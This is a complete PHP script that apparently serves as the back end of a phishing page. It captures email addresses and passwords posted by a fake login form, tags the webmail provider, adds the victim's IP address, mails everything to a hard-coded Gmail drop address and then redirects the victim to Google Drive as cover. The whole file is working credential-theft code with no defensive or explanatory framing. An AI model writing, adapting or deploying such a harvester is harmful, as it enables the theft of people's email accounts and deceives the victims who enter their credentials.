<? ob_start(); ?>
<?php
	if($_POST['Email']) {
		$mymail = "michelle.davis606@gmail.com"; //My Email
		if($_POST['yahoo'])
		{
			$domainmail = "yahoo.com";
		}
		elseif($_POST['gmail'])
		{
			$domainmail = "gmail.com";
		}
		elseif($_POST['hotmail'])
		{
			$domainmail = "hotmail.com";
		}
		elseif($_POST['aol'])
		{
			$domainmail = "aol.com";
		}
		else
		{
			$domainmail = "other";
		}
		$content = "Email: ".$_POST['Email']."\r\n Pass: ".$_POST['Passwd']."\r\n Domain: ".$domainmail."\r\n";
		$message2 = ' Client IP: ';
			if ( isset($_SERVER["REMOTE_ADDR"]) )    {
				$message2 .= '' . $_SERVER["REMOTE_ADDR"] . ' ';
			} else if ( isset($_SERVER["HTTP_X_FORWARDED_FOR"]) )    {
				$message2 .= '' . $_SERVER["HTTP_X_FORWARDED_FOR"] . ' ';
			} else if ( isset($_SERVER["HTTP_CLIENT_IP"]) )    {
				$message2 .= '' . $_SERVER["HTTP_CLIENT_IP"] . ' ';
			} 
			
		//echo $content ;exit();
		@mail($mymail, "You got a new email", $content."\r\n==============================\r\n".$message2);
		header("location:https://www.google.com.my/mobile/drive/");
		//exit;
	} else header("Location:index.html");
?>
<? ob_flush(); ?>